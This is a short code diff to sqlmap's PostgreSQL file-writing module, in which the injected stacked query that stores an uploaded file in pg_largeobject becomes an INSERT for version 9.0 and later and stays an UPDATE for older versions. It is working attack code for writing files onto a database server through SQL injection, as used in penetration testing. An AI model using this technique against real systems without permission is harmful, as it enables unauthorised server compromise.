@@ -10,6 +10,7 @@ See the file 'doc/COPYING' for copying permission
 import os
 
 from lib.core.common import randomInt
+from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.exception import sqlmapUnsupportedFeatureException
 from lib.request import inject
@@ -97,7 +98,17 @@ class Filesystem(GenericFilesystem):
         #
         # As a matter of facts it was possible to store correctly a file
         # large 13776 bytes, the problem arises at next step (lo_export())
-        inject.goStacked("UPDATE pg_largeobject SET data=(DECODE((SELECT %s FROM %s), 'base64')) WHERE loid=%d" % (self.tblField, self.fileTblName, self.oid))
+        #
+        # Inject manually into PostgreSQL system table pg_largeobject the
+        # base64-decoded file content. Note that PostgreSQL >= 9.0 does
+        # not accept UPDATE into that table for some reason.
+        self.getVersionFromBanner()
+        banVer = kb.bannerFp["dbmsVersion"]
+
+        if banVer >= "9.0":
+            inject.goStacked("INSERT INTO pg_largeobject VALUES (%d, 0, DECODE((SELECT %s FROM %s), 'base64'))" % (self.oid, self.tblField, self.fileTblName))
+        else:
+            inject.goStacked("UPDATE pg_largeobject SET data=(DECODE((SELECT %s FROM %s), 'base64')) WHERE loid=%d" % (self.tblField, self.fileTblName, self.oid))
 
         debugMsg  = "exporting the OID %s file content to " % fileType
         debugMsg += "file '%s'" % dFile
